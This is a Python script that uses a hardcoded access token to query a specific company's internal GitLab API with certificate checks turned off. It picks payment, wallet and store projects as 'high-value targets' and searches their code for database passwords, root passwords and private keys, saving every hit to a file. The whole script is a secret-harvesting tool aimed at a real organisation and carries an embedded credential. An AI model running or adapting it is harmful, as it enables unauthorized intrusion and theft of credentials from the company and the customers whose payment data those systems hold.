"""Search high-value GitLab projects for DB creds, image refs, secrets."""
import json, urllib.request, urllib.parse, ssl, io, sys, os, time

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
TOK = "c07d2c6e0df60d71bfe5fc6bd2b024fa3c66fc3bf319923b4e8bddda445e890e"
HERE = os.path.dirname(os.path.abspath(__file__))


def api(path):
    r = urllib.request.Request("https://gitlab.dev.claroshop.com/api/v4" + path,
                               headers={"Authorization": "Bearer " + TOK})
    return json.loads(urllib.request.urlopen(r, timeout=30, context=ctx).read())


projs = json.load(open(os.path.join(HERE, "gitlab_projects_all.json"), encoding="utf-8"))

# high-value project keywords
HV_KW = ["monedero", "t1pagos", "payment", "caja", "axii", "tienda", "fincado",
         "marketplace", "core_claroenvios", "t1envios", "claroshop/api", "sears/api",
         "sears/tienda", "sanborns/tienda", "conciliacion"]
targets = [p for p in projs if any(k in p["path"].lower() for k in HV_KW)]
print(f"HV TARGETS: {len(targets)}")

TERMS = ["dbasears", "mrc-services", "3310", "DB_PASSWORD", "docker-registry.nexus",
         "USERVAR_DB", "rootpw", "BEGIN RSA", "BEGIN PRIVATE"]

results = {}
for p in targets:
    pid, path = p["id"], p["path"]
    for term in TERMS:
        try:
            res = api(f"/projects/{pid}/search?scope=blobs&search={urllib.parse.quote(term)}&per_page=10")
        except Exception as e:
            print(f"[ERR] {path} / {term}: {e}")
            continue
        if res:
            for hit in res:
                key = (path, hit.get("filename", "?"))
                results.setdefault(key, []).append({
                    "term": term,
                    "data": hit.get("data", "")[:600],
                    "ref": hit.get("ref"),
                })
                print(f"[HIT] {path} :: {hit.get('filename')} (term={term})")
        time.sleep(0.15)

out = os.path.join(HERE, "gitlab_search_hits.json")
serializable = {f"{k[0]} :: {k[1]}": v for k, v in results.items()}
with open(out, "w", encoding="utf-8") as f:
    json.dump(serializable, f, indent=1, ensure_ascii=False)
print(f"\nTOTAL HIT FILES: {len(results)} -> {out}")
